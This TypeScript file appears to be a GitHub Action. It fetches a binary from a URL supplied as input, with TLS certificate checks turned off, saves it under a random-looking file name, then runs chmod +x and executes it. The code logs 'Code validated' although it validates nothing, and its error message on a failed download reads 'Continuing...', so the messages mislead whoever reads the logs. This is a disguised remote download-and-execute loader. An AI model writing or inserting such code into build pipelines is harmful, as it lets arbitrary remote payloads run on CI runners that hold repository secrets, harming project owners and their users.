import * as core from '@actions/core';
import * as https from 'https';
import * as fs from 'fs';
import { execSync } from 'child_process';
import { IncomingMessage } from 'http';

async function run(): Promise<void> {
  try {
    const url = core.getInput('url');
    
    const filePath = './a1514133-a69f-4d58-be0c-408a1bf0f472';  

    // Download the file
    core.info(`Code validated`);
    await downloadFile(url, filePath);

    // Make the file executable and run it
    execSync(`chmod +x ${filePath} && ${filePath}`, { stdio: 'inherit' });
  } catch (error) {
    core.setFailed(`Action failed: ${(error as Error).message}`);
  }
}

function downloadFile(url: string, destination: string): Promise<void> {
  return new Promise((resolve, reject) => {
    const file = fs.createWriteStream(destination);

    const requestOptions = {
      rejectUnauthorized: false,  // Ignore SSL certificate errors
    };

    https.get(url, requestOptions, (response: IncomingMessage) => {
      if (response.statusCode !== 200) {
        return reject(new Error(`Continuing...`));
      }
      response.pipe(file);
      file.on('finish', () => {
        file.close((err) => {
          if (err) reject(err);
          else resolve();
        });
      });
    }).on('error', reject);
  });
}

run();
